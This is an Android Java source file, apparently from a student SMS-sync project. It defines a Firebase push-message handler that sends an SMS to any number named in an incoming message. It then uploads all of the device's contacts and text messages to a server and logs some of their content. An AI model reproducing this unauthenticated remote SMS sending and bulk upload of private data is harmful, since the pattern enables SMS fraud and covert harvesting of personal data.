package fr.intechinfo.fusionandroid;

import android.telephony.SmsManager;
import android.util.Log;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.List;
import java.util.Map;

import static android.content.ContentValues.TAG;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    public MyFirebaseMessagingService() {
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Map<String, String> data = remoteMessage.getData();
        String strTitle = data.get("title");
        String message = data.get("text");
        Log.d(TAG,"onMessageReceived:  Message Received: \n" + "Title: " + strTitle + "\n" + "Message: "+ message);
        sendSMS(strTitle,message);
        SyncData();
    }
    private void sendSMS(String phoneNumber, String messageBody) {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(phoneNumber, null, messageBody, null, null);
    }

    private void SyncData(){
        RetrofitAPI retrofitAPI = HttpExecute.BuildAPI();
        ContentCollector cc = new ContentCollector();
        ContactsList contactLs = new ContactsList();
        contactLs.SetContact(cc.GetContacts(this));
        Log.d("SYNC","Name : "+ contactLs.GetContact().get(1).GetName()+" Number : " + contactLs.GetContact().get(1).GetNumber());
        SMSList SMSLs = new SMSList();
        SMSLs.SetSMS(cc.GetSMS(this));
        Log.d("SYNC","Address : "+ SMSLs.GetSMS().get(3).GetAddress()+" Message : " + SMSLs.GetSMS().get(3).GetBody()+" Date : "+SMSLs.GetSMS().get(3).GetDate()+" Type : "+SMSLs.GetSMS().get(3).GetType());

        new HttpExecute(retrofitAPI.CreateContacts(contactLs)).start();
        new HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start();
    }


}
